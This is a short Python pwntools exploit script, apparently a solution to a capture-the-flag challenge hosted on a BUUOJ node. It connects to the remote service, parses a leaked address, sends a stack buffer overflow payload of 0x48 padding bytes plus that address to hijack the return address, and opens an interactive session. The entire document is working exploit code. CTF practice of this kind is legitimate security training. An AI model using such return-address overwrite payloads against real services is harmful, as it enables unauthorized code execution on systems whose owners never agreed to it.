from pwn import *
context.log_level = "debug"

conn = remote("node3.buuoj.cn","29673")

conn.recvuntil("WOW:")
addr = int(conn.recv()[:-1],16)
print addr
payload = 'a'* 0x48 + p64(addr)
conn.sendline(payload)
conn.interactive()
